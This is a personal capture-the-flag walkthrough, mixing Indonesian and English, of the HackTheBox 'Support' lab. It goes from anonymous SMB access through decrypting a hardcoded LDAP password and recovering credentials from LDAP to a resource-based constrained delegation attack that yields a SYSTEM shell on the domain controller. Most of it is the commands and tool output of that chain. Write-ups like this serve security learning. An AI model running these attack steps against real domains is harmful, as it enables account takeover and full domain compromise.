# Machine - Support
- note: mostly aku pakai AI disini, walaupun beberapa aku paham
- soalnya ga terlalu jago di AD
- aku menulis ini buat catatan kedepannya aja sih 
- biar ingat sama pattern2 exploitnya 

# user.txt - User Flag Process
## SMB enum
- cek SMB bisa tanpa creds atau ga
```bash
nxc smb 10.129.230.181 -u '' -p '' --shares
nxc smb 10.129.230.181 -u ' ' -p '' --shares
```
- outputnya ada
```bash
> nxc smb 10.129.230.181 -u '' -p '' --shares
SMB         10.129.230.181  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.230.181  445    DC               [-] Connection Error: The NETBIOS connection with the remote host timed out.
SMB         10.129.230.181  445    DC               [-] Error enumerating shares: The NETBIOS connection with the remote host timed out.
> nxc smb 10.129.230.181 -u ' ' -p '' --shares
SMB         10.129.230.181  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.230.181  445    DC               [+] support.htb\ : (Guest)
SMB         10.129.230.181  445    DC               [*] Enumerated shares
SMB         10.129.230.181  445    DC               Share           Permissions     Remark
SMB         10.129.230.181  445    DC               -----           -----------     ------
SMB         10.129.230.181  445    DC               ADMIN$                          Remote Admin
SMB         10.129.230.181  445    DC               C$                              Default share
SMB         10.129.230.181  445    DC               IPC$            READ            Remote IPC
SMB         10.129.230.181  445    DC               NETLOGON                        Logon server share 
SMB         10.129.230.181  445    DC               support-tools   READ            support staff tools
SMB         10.129.230.181  445    DC               SYSVOL                          Logon server share 
~/thm/HTB/support main !91 ?26 >                   
```

### Ada share yang bisa di READ
- yg read
```bash
SMB         10.129.230.181  445    DC               support-tools   READ            support staff tools
```
- akses aja
```bash
smbclient \\\\10.129.230.181\\support-tools
```
- download file di dalem
```bash
get UserInfo.exe.zip
```

## Analyze the file

- ekstrak file
```bash
unzip UserInfo.exe.zip
```

- dapat ini: UserInfo.exe sama file config
```bash
strings UserInfo.exe | grep password
```
- di strings gada apa apa sih

### Decompile Binary
- coba decompile exe ke dotnet file cs, pakai ini
- di mesinku gada alat decomp nya pakai ilspycmd
```bash
dotnet tool install --global ilspycmd --version 7.2.1.6856
```
- export path biar bisa run
```bash
export PATH="$PATH:$HOME/.dotnet/tools"
```
- baru run toolsnya
```bash
ilspycmd UserInfo.exe > hasil.cs
```
- cek code nya
```bash
cat hasil.cs
```
### Decompiled and analyze the code
- hasil.cs
```cs
using System;
using System.Collections;
using System.Diagnostics;
using System.DirectoryServices;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Runtime.Versioning;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using MatthiWare.CommandLine;
using MatthiWare.CommandLine.Abstractions.Command;
using MatthiWare.CommandLine.Core.Attributes;
using UserInfo.Services;

[assembly: CompilationRelaxations(8)]
[assembly: RuntimeCompatibility(WrapNonExceptionThrows = true)]
[assembly: Debuggable(DebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints)]
[assembly: AssemblyTitle("UserInfo")]
[assembly: AssemblyDescription("")]
[assembly: AssemblyConfiguration("")]
[assembly: AssemblyCompany("")]
[assembly: AssemblyProduct("UserInfo")]
[assembly: AssemblyCopyright("Copyright ©  2022")]
[assembly: AssemblyTrademark("")]
[assembly: ComVisible(false)]
[assembly: Guid("5a280d0b-9fd0-4701-8f96-82e2f1ea9dfb")]
[assembly: AssemblyFileVersion("1.0.0.0")]
[assembly: TargetFramework(".NETFramework,Version=v4.8", FrameworkDisplayName = ".NET Framework 4.8")]
[assembly: AssemblyVersion("1.0.0.0")]
namespace UserInfo
{
	internal class Program
	{
		private static async Task Main(string[] args)
		{
			CommandLineParserOptions val = new CommandLineParserOptions();
			val.set_AppName("UserInfo.exe");
			CommandLineParser<GlobalOptions> obj = new CommandLineParser<GlobalOptions>(val);
			obj.DiscoverCommands(Assembly.GetExecutingAssembly());
			(await obj.ParseAsync(args)).get_HasErrors();
		}
	}
	public class GetUserOptions
	{
		[Name("username")]
		[Required(true)]
		[Description("Username")]
		public string UserName { get; set; }
	}
	public class FindUserOptions
	{
		[Name("first")]
		[Description("First name")]
		public string FirstName { get; set; }

		[Name("last")]
		[Description("Last name")]
		public string LastName { get; set; }
	}
	public class GlobalOptions
	{
		[Name("v", "verbose")]
		[DefaultValue(false)]
		[Description("Verbose output")]
		public bool Verbose { get; set; }
	}
}
namespace UserInfo.Services
{
	internal class Protected
	{
		private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";
		private static byte[] key = Encoding.ASCII.GetBytes("armando");
		public static string getPassword()
		{
			byte[] array = Convert.FromBase64String(enc_password);
			byte[] array2 = array;
			for (int i = 0; i < array.Length; i++)
			{
				array2[i] = (byte)((uint)(array[i] ^ key[i % key.Length]) ^ 0xDFu);
			}
			return Encoding.Default.GetString(array2);
		}
	}
	internal class LdapQuery
	{
		private DirectoryEntry entry;

		private DirectorySearcher ds;

		public LdapQuery()
		{
			//IL_0018: Unknown result type (might be due to invalid IL or missing references)
			//IL_0022: Expected O, but got Unknown
			//IL_0035: Unknown result type (might be due to invalid IL or missing references)
			//IL_003f: Expected O, but got Unknown
			string password = Protected.getPassword();
			entry = new DirectoryEntry("LDAP://support.htb", "support\\ldap", password);
			entry.set_AuthenticationType((AuthenticationTypes)1);
			ds = new DirectorySearcher(entry);
		}

		public void query(string first, string last, bool verbose = false)
		{
			//IL_011e: Unknown result type (might be due to invalid IL or missing references)
			try
			{
				if (first == null && last == null)
				{
					Console.WriteLine("[-] At least one of -first or -last is required.");
					return;
				}
				string text = ((last == null) ? ("(givenName=" + first + ")") : ((first != null) ? ("(&(givenName=" + first + ")(sn=" + last + "))") : ("(sn=" + last + ")")));
				if (verbose)
				{
					Console.WriteLine("[*] LDAP query to use: " + text);
				}
				ds.set_Filter(text);
				ds.get_PropertiesToLoad().Add("sAMAccountName");
				SearchResultCollection val = ds.FindAll();
				if (val.get_Count() == 0)
				{
					Console.WriteLine("[-] No users identified with that query.");
					return;
				}
				if (verbose)
				{
					string text2 = "[+] Found " + val.get_Count() + " result";
					if (val.get_Count() > 1)
					{
						text2 += "s";
					}
					text2 += ":";
					Console.WriteLine(text2);
				}
				foreach (SearchResult item in val)
				{
					if (verbose)
					{
						Console.Write("       ");
					}
					Console.WriteLine(item.get_Properties().get_Item("sAMAccountName").get_Item(0));
				}
			}
			catch (Exception ex)
			{
				Console.WriteLine("[-] Exception: " + ex.Message);
			}
		}

		public void printUser(string username, bool verbose = false)
		{
			try
			{
				if (verbose)
				{
					Console.WriteLine("[*] Getting data for " + username);
				}
				ds.set_Filter("sAMAccountName=" + username);
				ds.get_PropertiesToLoad().Add("pwdLastSet");
				ds.get_PropertiesToLoad().Add("lastLogon");
				ds.get_PropertiesToLoad().Add("givenName");
				ds.get_PropertiesToLoad().Add("sn");
				ds.get_PropertiesToLoad().Add("mail");
				SearchResult val = ds.FindOne();
				if (val == null)
				{
					Console.WriteLine("[-] Unable to locate " + username + ". Please try the find command to get the user's username.");
					return;
				}
				if (((ReadOnlyCollectionBase)(object)val.get_Properties().get_Item("givenName")).Count > 0)
				{
					Console.WriteLine("First Name:           " + val.get_Properties().get_Item("givenName").get_Item(0));
				}
				if (((ReadOnlyCollectionBase)(object)val.get_Properties().get_Item("sn")).Count > 0)
				{
					Console.WriteLine("Last Name:            " + val.get_Properties().get_Item("sn").get_Item(0));
				}
				if (((ReadOnlyCollectionBase)(object)val.get_Properties().get_Item("mail")).Count > 0)
				{
					Console.WriteLine("Contact:              " + val.get_Properties().get_Item("mail").get_Item(0));
				}
				if (val.get_Properties().Contains("pwdLastSet"))
				{
					Console.WriteLine("Last Password Change: " + DateTime.FromFileTime((long)val.get_Properties().get_Item("pwdLastSet").get_Item(0)));
				}
			}
			catch (Exception ex)
			{
				Console.WriteLine("[-] Exception: " + ex.Message);
			}
		}
	}
}
namespace UserInfo.Commands
{
	public class FindUser : Command<GlobalOptions, FindUserOptions>
	{
		public override void OnConfigure(ICommandConfigurationBuilder builder)
		{
			builder.Name("find").Description("Find a user");
		}

		public override async Task OnExecuteAsync(GlobalOptions options, FindUserOptions commandOptions, CancellationToken cancellationToken)
		{
			new LdapQuery().query(commandOptions.FirstName, commandOptions.LastName, options.Verbose);
		}
	}
	public class GetUser : Command<GlobalOptions, GetUserOptions>
	{
		public override void OnConfigure(ICommandConfigurationBuilder builder)
		{
			builder.Name("user").Description("Get information about a user");
		}
		public override async Task OnExecuteAsync(GlobalOptions options, GetUserOptions commandOptions, CancellationToken cancellationToken)
		{
			new LdapQuery().printUser(commandOptions.UserName, options.Verbose);
		}
	}
}
```
- bagian sekitar sini sus 
```cs
	internal class Protected
	{
		private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";
		private static byte[] key = Encoding.ASCII.GetBytes("armando");
		public static string getPassword()
		{
			byte[] array = Convert.FromBase64String(enc_password);
			byte[] array2 = array;
			for (int i = 0; i < array.Length; i++)
			{
				array2[i] = (byte)((uint)(array[i] ^ key[i % key.Length]) ^ 0xDFu);
			}
			return Encoding.Default.GetString(array2);
		}
	}
```
- coba copas codenya suruh AI yang decrypt nanti
- dapet begini, taruh di dc.py :
```py
#!/usr/bin/env python3
import base64

enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
key = b"armando"

# Decode base64
encrypted = base64.b64decode(enc_password)

# Decrypt
password = ""
for i in range(len(encrypted)):
    decrypted_byte = (encrypted[i] ^ key[i % len(key)]) ^ 0xDF
    password += chr(decrypted_byte)

print(f"Username: support\\ldap")
print(f"Password: {password}")
```
- run program and crack 
```bash
python3 dc.py
```
- output
```bash
Username: support\ldap
Password: nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

## LDAP enum
- cek list user di ldap
```bash
nxc ldap 10.129.230.181 -u support\ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --users
```
- gabisa deng bisanya gini
```bash
nxc ldap 10.129.230.181 -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --users
```
- output
```bash
LDAP                     10.129.230.181  389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:support.htb) (signing:None) (channel binding:No TLS cert)
LDAP                     10.129.230.181  389    DC               [+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
LDAP                     10.129.230.181  389    DC               [*] Enumerated 20 domain users: support.htb
LDAP                     10.129.230.181  389    DC               -Username-                    -Last PW Set-       -BadPW-  -Description-
LDAP                     10.129.230.181  389    DC               Administrator                 2022-07-20 00:55:56 0        Built-in account for administering the computer/domain
LDAP                     10.129.230.181  389    DC               Guest                         2022-05-28 18:18:55 0        Built-in account for guest access to the computer/domain
LDAP                     10.129.230.181  389    DC               krbtgt                        2022-05-28 18:03:43 0        Key Distribution Center Service Account
LDAP                     10.129.230.181  389    DC               ldap                          2022-05-28 18:11:46 0
LDAP                     10.129.230.181  389    DC               support                       2022-05-28 18:12:00 0
LDAP                     10.129.230.181  389    DC               smith.rosario                 2022-05-28 18:12:19 0
LDAP                     10.129.230.181  389    DC               hernandez.stanley             2022-05-28 18:12:34 0
LDAP                     10.129.230.181  389    DC               wilson.shelby                 2022-05-28 18:12:50 0
LDAP                     10.129.230.181  389    DC               anderson.damian               2022-05-28 18:13:05 0
LDAP                     10.129.230.181  389    DC               thomas.raphael                2022-05-28 18:13:21 0
LDAP                     10.129.230.181  389    DC               levine.leopoldo               2022-05-28 18:13:37 0
LDAP                     10.129.230.181  389    DC               raven.clifton                 2022-05-28 18:13:53 0
LDAP                     10.129.230.181  389    DC               bardot.mary                   2022-05-28 18:14:08 0
LDAP                     10.129.230.181  389    DC               cromwell.gerard               2022-05-28 18:14:24 0
LDAP                     10.129.230.181  389    DC               monroe.david                  2022-05-28 18:14:39 0
LDAP                     10.129.230.181  389    DC               west.laura                    2022-05-28 18:14:55 0
LDAP                     10.129.230.181  389    DC               langley.lucy                  2022-05-28 18:15:10 0
LDAP                     10.129.230.181  389    DC               daughtler.mabel               2022-05-28 18:15:26 0
LDAP                     10.129.230.181  389    DC               stoll.rachelle                2022-05-28 18:15:42 0
LDAP                     10.129.230.181  389    DC               ford.victoria                 2022-05-28 18:15:58 0
```

### Bloodhound enum
- bloodhound, and masukin semua json nya
```bash
bloodhound-python -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -d support.htb -ns 10.129.230.181 -c all
```
- di bloodhound ganemu apa apa, di ldapsearch ada di field info
- entah kenapa info di bloodhound susah nyarinya, ini samaccount name nya filter ke yang support 

### LDAPsearch enum
```bash
ldapsearch -x -H ldap://10.129.230.181 -D 'support\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb" "(sAMAccountName=support)"
```
- output
```bash
# extended LDIF
#
# LDAPv3
# base <DC=support,DC=htb> with scope subtree
# filter: (sAMAccountName=support)
# requesting: ALL
#

# support, Users, support.htb
dn: CN=support,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: support
c: US
l: Chapel Hill
st: NC
postalCode: 27514
distinguishedName: CN=support,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528111200.0Z
whenChanged: 20260327151945.0Z
uSNCreated: 12617
info: Ironside47pleasure40Watchful
memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
uSNChanged: 90212
company: support
streetAddress: Skipper Bowles Dr
name: support
objectGUID:: CqM5MfoxMEWepIBTs5an8Q==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132982099209777070
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEILUQQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: support
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=support,DC=htb
dSCorePropagationData: 20220528111201.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 134190983850271423

# search reference
ref: ldap://ForestDnsZones.support.htb/DC=ForestDnsZones,DC=support,DC=htb

# search reference
ref: ldap://DomainDnsZones.support.htb/DC=DomainDnsZones,DC=support,DC=htb

# search reference
ref: ldap://support.htb/CN=Configuration,DC=support,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 5
# numEntries: 1
# numReferences: 3
```
- dia ada di object info nya si support, pass buat creds si support
```bash
info: Ironside47pleasure40Watchful
```

### WinRM to user 
```bash
evil-winrm -i 10.129.230.181 -u support -p 'Ironside47pleasure40Watchful'
```
- klaim user flag

# root.txt - Root Flag Process
## BloodHound Analysis
- cek di bloodhound tadi, si support@support.htb ini cek di outbound object control
### Resource-Based Constrained Delegation (RBCD)
- dia masuk ke dc.support.htb, genericall dari SHARED SUPPORT ACCOUNTS@SUPPORT.HTB
- cari tau exploitnya, referensi dari sini
- https://medium.com/r3d-buck3t/how-to-abuse-resource-based-constrained-delegation-to-gain-unauthorized-access-36ac8337dd5a
### Check MachineAccountQuota
- ini nurut aja sih sama AI
```bash
Get-ADObject -Identity ((Get-ADDomain).distinguishedname) -Properties ms-DS-MachineAccountQuota
```
### Uploads
- upload powerview and used
```bash
upload PowerView.ps1 .
. .\PowerView.ps1
upload Powermad.ps1 .
. .\Powermad.ps1
```
### Verify RBCD
```bash
Get-DomainComputer DC | select name, msds-allowedtoactonbehalfofotheridentity   
```


### Create comp object 
- buat aja
```bash
New-MachineAccount -MachineAccount BATAGOR-COMP1 -Password $(ConvertTo-SecureString 'Sidusmith123' -AsPlainText -Force)
Get-ADComputer -identity BATAGOR-COMP1
```
### Config RBCD :
```bash
Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount BATAGOR-COMP1$
Get-ADComputer -Identity DC -Properties PrincipalsAllowedToDelegateToAccount
Get-DomainComputer DC | select msds-allowedtoactonbehalfofotheridentity
```
### Parse security descriptor
- buat dulu
```bash
$RawBytes = Get-DomainComputer DC -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity 

$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
```
- verify
```bash
$Descriptor
$Descriptor.DiscretionaryAcl  
```

### GetServiceTicket
- make sure udah masuk etc host domainnya
- masukin ke /etc/hosts -> ip [support.htb] [dc.support.htb]
- run impacket, export ticket
```bash
impacket-getST -spn cifs/dc.support.htb -impersonate Administrator support.htb/BATAGOR-COMP1$:Sidusmith123 
export KRB5CCNAME=Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
```
- ini btw sesuai nama hasil dari impacket barusan di save ticket sebagai apa
- kebetulan disini ini:
- Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
- jadi sesuaikan aja
- get SYSTEM shell
```bash
impacket-psexec -k -no-pass dc.support.htb
```
- klaim root
